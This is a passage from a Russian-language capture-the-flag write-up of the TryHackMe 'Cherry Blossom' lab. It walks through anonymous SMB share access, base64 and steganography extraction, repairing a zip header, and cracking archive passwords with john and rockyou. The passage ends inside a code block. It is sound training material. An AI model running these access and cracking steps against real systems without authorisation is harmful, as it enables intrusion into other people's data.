+</span></span><span style="display:flex;"><span>|   FQDN: cherryblossom
+</span></span><span style="display:flex;"><span>|_  System time: 2026-07-01T10:04:05+01:00
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2026-07-01T09:04:05
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: -19m58s, deviation: 34m37s, median: 0s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 220.76 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Получилось выудить много полезной информации. Начнем с того, что у нас есть 445 порт, на котором висит SMB. Но, так как я запустил nmap с флагом <strong>-sc</strong>, вдобавок ко всему этому мы видим, что есть возможность анонимного доступа (account_used: guest). То есть, мы можем просмотреть список доступных шар, и даже подключиться к какой-нибудь шаре. Для этого используем smbclient.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ smbclient -L //10.113.182.130/ -N         
+</span></span><span style="display:flex;"><span>Anonymous login successful
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>        ---------       ----      -------
+</span></span><span style="display:flex;"><span>        Anonymous       Disk      Anonymous File Server Share
+</span></span><span style="display:flex;"><span>        IPC$            IPC       IPC Service <span style="color:#f92672">(</span>Samba 4.7.6-Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Reconnecting with SMB1 <span style="color:#66d9ef">for</span> workgroup listing.
+</span></span><span style="display:flex;"><span>Anonymous login successful
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Server               Comment
+</span></span><span style="display:flex;"><span>        ---------            -------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Workgroup            Master
+</span></span><span style="display:flex;"><span>        ---------            -------
+</span></span><span style="display:flex;"><span>        WORKGROUP            UBUNTU
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Как видим, старый nmap нам не наврал, возможность анонимного подключения к SMB действительно существует. Больше всего нас здесь интересует шара под манящим названием <strong>Anonuymous</strong>. Мы присоединимся к ней и посмотрим, что же она скрывает.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ smbclient //10.113.182.130/Anonymous -N
+</span></span><span style="display:flex;"><span>Anonymous login successful
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sun Feb  <span style="color:#ae81ff">9</span> 19:22:51 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sun Feb  <span style="color:#ae81ff">9</span> 12:48:18 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  journal.txt                         N  <span style="color:#ae81ff">3470998</span>  Sun Feb  <span style="color:#ae81ff">9</span> 19:20:53 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">10253588</span> blocks of size 1024. <span style="color:#ae81ff">4680100</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get journal.txt
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\j</span>ournal.txt of size <span style="color:#ae81ff">3470998</span> as journal.txt <span style="color:#f92672">(</span>1179.4 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1179.4 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>После подключения к шаре Anonymous я нашёл файл с говорящим названием, который сразу же забрал к себе на комп. Если вам интересно содержимое этого файла точно также, как и мне, то спешу вас разочаровать, оно закодировано.</p>
+<p><img alt="Содержимое файла" loading="lazy" src="/images/cblossom-journal.webp"></p>
+<p>Мы видим здесь кодировку base64. Думаю, для начала стоит попробовать все это привести к &ldquo;человеческому&rdquo; виду, прибегнув к использованию утилиты <strong>base64</strong>.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat journal.txt | base64 -d &gt; result
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>После декодирования содержимого файла к &ldquo;человеческому&rdquo; виду прийти не удалось, но самое главное, что содержимое все-таки было декодировано. Учитывая, что автор явно пытается что-то спрятать, я для начала решил проверить, что из себя вообще представляет получившийся в ходе декодирования файл, и получил предсказуемый вывод.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file result         
+</span></span><span style="display:flex;"><span>result: PNG image data, <span style="color:#ae81ff">1280</span> x 853, 8-bit/color RGB, non-interlaced
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Получившийся декодированный файл является изображением формата PNG. А это значит, что нам предстоит столкнуться со стеганографией. Кстати, если вам вдруг интересно, то картинка там следующего характера.</p>
+<p><img alt="Картинка" loading="lazy" src="/images/cblossom-stego.webp"></p>
+<p>Для того, чтобы разгадать секрет картинки, существует много стеганографических тулов. Я решил воспользоваться <strong>stegpy</strong>. И мне даже удалось кое-что добыть.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ stegpy result
+</span></span><span style="display:flex;"><span>File _journal.zip succesfully extracted from result
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>К сожалению, это была не последняя искрометная шутка автора комнаты, потому что архив поврежден.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ unzip _journal.zip
+</span></span><span style="display:flex;"><span>Archive:  _journal.zip
+</span></span><span style="display:flex;"><span>file <span style="color:#75715e">#1:  bad zipfile offset (local header sig):  0</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>На самом деле, хорошо, когда в таких случаях до автоматизма доведена привычка использовать <strong>file</strong>, потому что он может сэкономить часы мозгового штурма.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file _journal.zip
+</span></span><span style="display:flex;"><span>_journal.zip: JPEG image data
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Конечно, фокус с изменением расширения файла не сработал. Перед нами на этот раз нет ни сакуры, ни самурая, но зато в ходе &ldquo;упорного&rdquo; мозгового штурма возникла другая идея. Раз уж это на самом деле не картинка, а вылезло это чудо изначально с расширением .zip, может, стоит попробовать поменять магическое число? Помочь с изменением того самого числа может <strong>hexedit</strong>, ну, а помнить его для .zip архива необязательно (но если помните, снимаю шляпу).</p>
+<p><img alt="Изменение магического числа" loading="lazy" src="/images/cblossom-hexedit.webp"></p>
+<p>Впереди было две новости, по классике, хорошая - это действительно .zip архив, и его теперь можно открыть, плохая - нужен так называемый passphrase.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ unzip _journal.zip
+</span></span><span style="display:flex;"><span>Archive:  _journal.zip
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>_journal.zip<span style="color:#f92672">]</span> Journal.ctz password: 
+</span></span><span style="display:flex;"><span>   skipping: Journal.ctz             incorrect password
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>В этом деле я всегда обращаюсь к своему старому товарищу. В большинстве случаев для него это дело нескольких минут. Кто не понял, обратимся к <strong>john</strong>, а ещё точнее, к его дополнению <strong>zip2john</strong>.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ zip2john _journal.zip &gt; zip_hash.txt
+</span></span><span style="display:flex;"><span>ver 2.0 efh <span style="color:#ae81ff">5455</span> efh <span style="color:#ae81ff">7875</span> _journal.zip/Journal.ctz PKZIP Encr: TS_chk, cmplen<span style="color:#f92672">=</span>70461, decmplen<span style="color:#f92672">=</span>70434, crc<span style="color:#f92672">=</span>0B987D84 ts<span style="color:#f92672">=</span><span style="color:#ae81ff">0035</span> cs<span style="color:#f92672">=</span><span style="color:#ae81ff">0035</span> type<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Получившийся хэш кормим самому джону и через пару мгновений наблюдаем результат.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ john --wordlist<span style="color:#f92672">=</span>rockyou.txt zip_hash.txt
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>PKZIP <span style="color:#f92672">[</span>32/64<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">4</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>REDACTED<span style="color:#f92672">]</span>        <span style="color:#f92672">(</span>_journal.zip/Journal.ctz<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:00:00 DONE <span style="color:#f92672">(</span>2026-07-01 06:39<span style="color:#f92672">)</span> 50.00g/s 409600p/s 409600c/s 409600C/s 123456..whitetiger
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Как оно неудивительно, в этом архиве оказался другой архив.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ unzip _journal.zip
+</span></span><span style="display:flex;"><span>Archive:  _journal.zip
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>_journal.zip<span style="color:#f92672">]</span> Journal.ctz password: 
+</span></span><span style="display:flex;"><span>  inflating: Journal.ctz 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Кстати, он тоже запаролен. В поисках информации я подался в ближайший браузер и обнаружил, что добытый мною архив является производной приложения Cherrytree. Как говорится, &ldquo;у страха глаза велики&rdquo;, потому как передо мной на самом деле оказался 7zip архив, это я понял после изучения информации и совета вновь заюзать file (помним про доведение до автоматизма? :&gt;).</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file Journal.ctz 
+</span></span><span style="display:flex;"><span>Journal.ctz: 7-zip archive data, version 0.4
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Но! В этот раз поиграться с zip2john не выйдет. Но, как я узнал, у джона есть ещё один тул, как раз-таки направленный на 7z архивы. Вы даже не представляете как он называется! Не волнуйтесь, сообщаю: <strong>7z2john</strong>. Синтаксис столь же прост, как и название чудо тула.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ 7z2john Journal.ctz &gt; 7z_hash.txt
+</span></span><span style="display:flex;"><span>ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Как видите, программа крайне настоятельно просит меня не раскрывать хэш. Поэтому последую её совету и ни в коем случае не буду этого делать (самые любознательные могут получить его в ходе прохождения этой комнаты на THM). Я же следую далее и вновь обращаюсь к своему товарищу (абсолютно безвозмездно) с просьбой разгадать passphrase. На этот раз времени ушло чуть больше.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
